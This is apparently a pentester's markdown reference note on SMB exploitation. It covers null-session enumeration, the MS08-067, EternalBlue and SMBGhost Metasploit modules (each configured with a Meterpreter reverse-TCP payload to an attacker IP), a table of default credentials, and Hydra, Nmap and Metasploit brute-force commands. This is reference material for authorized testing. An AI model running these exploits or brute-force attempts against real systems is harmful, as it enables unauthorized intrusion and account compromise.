---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SMB/Exploitation
links: "[[SMB]]"
---

# Exploitation

<!-- Checklist {{{-->
## Checklist

- [ ] [[Enumeration#RPCclient|RPCclient]]
    - [ ] [[Enumeration#Connect|Connect]]
- [ ] [[Usage#Smbclient|Smbclient]]
    - [ ] [[Usage#Connect|Connect]]
        - [ ] [[Usage#Linux|Linux]]
        - [ ] [[Usage#Windows|Windows]]
    - [ ] [[Usage#SMB Actions|Enumeration]]

- [ ] [[Exploitation#Metasploit|Metasploit]]
    - [ ] [[Exploitation#CVE Exploits|CVE Exploits]]
- [ ] [[Exploitation#Common Credentials|Common Credentials]]
- [ ] [[Exploitation#Brute Force|Brute Force]]
- [ ] [[Exploitation#EternalBlue|EternalBlue]]

___

<!-- }}} -->

<!-- SMB Null Session {{{-->
## SMB Null Session

An [SMB Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session)
refers to an unauthenticated connection to an SMB server

[[Enumeration#RPCclient|RPCclient]]

```sh
rpcclient -U "" <target>
```

[[Usage#smbclient|smbclient]]

```sh
smbclient -N -L //<target>
```

[[Enumeration#SMBmap|SMBmap]]

```sh
smbmap -H <target> -u "" -p ""
```

___

<!-- }}} -->

<!-- IPC$ Share {{{-->
## IPC$ Share

Access to the
[IPC$](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html#ipc-share)
share can be obtained through an anonymous null session.

> [!todo]

[[Enumeration#Enum4Linux-ng|Enum4Linux-ng]] can be utilized to interact
with the exposed services via named pipes.

___

<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

> [!todo]

### Metasploit

Search for exploits with Metasploit

```sh
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```

<!-- Netapi (MS08-067) {{{-->
#### Netapi

> [!example]-
>
> ```sh
> use exploit/windows/smb/ms08_067_netapi
> set RHOSTS <target>
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <attacker_ip>
> exploit
> ```

<!-- }}} -->

<!-- EternalBlue (MS17-010) {{{-->
#### EternalBlue

Metasploit has several [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
for [[EternalBlue]] that can be used to validate and exploit the vulnerability

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS <target>
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <attacker_ip>
> exploit
> ```
>
> > [!info]-
> >
> > Connects to each target on port 445.
> >
> > Sends specific SMBv1 crafted packets used
> > in known EternalBlue detection techniques.
> >
> > Checks for:
> > - SMBv1 support
> > - Signs of vulnerability to MS17-010
> > - System info (*OS, hostname, etc.*)

[SecWiki-MS17-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-010/ms17_010_eternalblue.rb)
<!-- }}} -->

<!-- }}} -->

<!-- SMBGhost (CVE-2020-0796) {{{-->
### SMBGhost

A remote code execution vulnerability exists in the way
that the Microsoft [[General|SMB]] 3.1.1 (SMBv3) protocol
handles certain requests

> [!example]-
>
> ```sh
> use exploit/windows/smb/cve_2020_0796_smbghost
> set RHOSTS <target>
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <attacker_ip>
> exploit
> ```

<!-- }}} -->

___

<!-- }}} -->

<!-- Common Credentials {{{-->
## Common Credentials

> [!danger]-
>
> | Username             | Password                                |
> | -------------------- | --------------------------------------- |
> | (blank)              | (blank)                                 |
> | guest                | (blank)                                 |
> | Administrator, admin | (blank), password, administrator, admin |
> | arcserve             | arcserve, backup                        |
> | tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
> | backupexec, backup   | backupexec, backup, arcada              |
> | test, lab, demo      | password, test, lab, demo               |

___

<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

### Nmap

Brute force SMB login with [[Nmap]]'s
[smb-brute](https://nmap.org/nsedoc/scripts/smb-brute.html)

```sh
nmap --script smb-brute -p 445 <target> -oA smb-brute-force
```

Brute force SMB login with [[Nmap]] and custom credentials

```sh
nmap -p 445 --script smb-brute --script-args userdb=<users.txt>,passdb=<passwords.txt> <target> -oA smb-brute-force-custom-credentials
```

### Hydra

Brute force SMB login with [[Hydra]]

```sh
hydra -l <target_user> -P <passwords.txt> <target> smb -t 1
```

```sh
hydra -l administrator -P <passwords.txt> smb://<target>
```

### Metasploit

Brute force SMB login with [[Metasploit]]

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Search Exploit|Search Exploit]]
>
> 2. [[Metasploit#Select Exploit|Select Exploit]]
>
> ```sh
> use auxiliary/scanner/smb/smb_login
> ```
>
> 3. [[Metasploit#Set Option|Set options]]
>
> ```sh
> set RHOSTS target.com
> ```
>
> ```sh
> set USER_FILE /path/to/users.txt
> ```
>
> ```sh
> set PASS_FILE /path/to/passwords.txt
> ```
>
> ```sh
> set STOP_ON_SUCCESS true
> ```
>
> 4. [[Metasploit#Run Exploit|Run exploit]]
>
> ```sh
> exploit
> ```
<!-- }}} -->

___

<!-- }}} -->

___

<!-- }}} -->
